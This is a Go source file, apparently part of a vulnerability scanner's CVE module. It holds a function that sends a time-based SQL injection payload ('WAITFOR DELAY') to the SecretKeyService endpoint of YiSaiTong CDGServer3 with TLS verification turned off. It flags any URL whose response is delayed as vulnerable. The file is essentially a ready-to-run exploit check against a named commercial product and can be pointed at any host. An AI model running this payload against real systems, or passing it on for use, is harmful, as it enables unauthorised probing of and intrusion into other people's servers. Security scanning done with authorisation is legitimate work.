package CVEs

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

func YiSaiTong_SQLInjection(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:5'--+", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	// 记录请求开始时间
	startTime := time.Now()

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	// 记录请求结束时间
	endTime := time.Now()

	// 计算请求时长
	duration := endTime.Sub(startTime)

	if 3*time.Second <= duration && duration <= 7*time.Second {
		fmt.Println("[*]YiSaiTong_SQLInjection : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:5'--+\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
